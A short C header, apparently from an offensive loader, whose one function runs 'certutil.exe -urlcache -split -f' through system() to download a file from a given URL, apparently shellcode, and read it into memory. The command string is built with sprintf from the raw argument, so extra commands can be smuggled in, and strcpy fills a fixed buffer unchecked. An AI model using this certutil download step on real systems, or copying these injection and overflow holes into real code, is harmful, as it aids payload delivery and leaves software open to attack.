#pragma once

#include <stdio.h>
#include <windows.h>
#include <string.h>
#include "../debug_print/debug_print.h"
#include "helper_functions/helper_functions.h"


// Downloads data from the URI specified in arg1 to a file.
// The data is then retrieved from the file.
//
// data_size receives the size of the data in bytes.
unsigned char* download_certutil(char *arg1, int *data_size) {
	DEBUG_PRINT("Downloading data to file via certutil...\n");	
	
	char download[500];  //how not to do it...
	sprintf(download,"certutil.exe -urlcache -split -f %s", arg1);

	DEBUG_PRINT("url: %s\n", download);
	
	system(download);
	
    DEBUG_PRINT("Download done.\n");
	
	char sh_filename[128];
	strcpy(sh_filename, get_filename_from_url(arg1));
	
	DEBUG_PRINT("sh_filename = %s\n", sh_filename);
		
	*data_size = get_filesize(sh_filename);	
	return load_textfile(sh_filename, *data_size);	
}
